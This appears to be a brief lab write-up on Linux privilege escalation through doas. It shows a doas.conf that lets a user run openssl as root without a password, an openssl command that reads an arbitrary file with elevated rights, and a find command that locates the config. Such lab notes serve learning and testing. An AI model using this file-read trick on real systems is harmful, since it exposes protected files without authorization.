- Doas is a software that has the same function as the more known Sudo, but it lacks all the extra features (by design) Sudo has, like kerberos and ldap.
- It is also developed and maintained by the people behind OpenBSD.

![Untitled](https://github.com/0xMuhammadEhab/Linux-PrivEsc/blob/main/easy/doas/img/Untitled.png)

`cat /etc/doas.conf`

```
plot_admin@plotted:/tmp$ cat /etc/doas.conf
permit nopass plot_admin as root cmd openssl
```

giftbino  openssl

```
LFILE=file_to_read
openssl enc -in "$LFILE"
```

- find config file

```bash
find / -name "doas.conf" 2> /dev/null
```

![Untitled](https://github.com/0xMuhammadEhab/Linux-PrivEsc/blob/main/easy/doas/img/Untitled(1).png)

![Untitled](https://github.com/0xMuhammadEhab/Linux-PrivEsc/blob/main/easy/doas/img/Untitled(2).png)
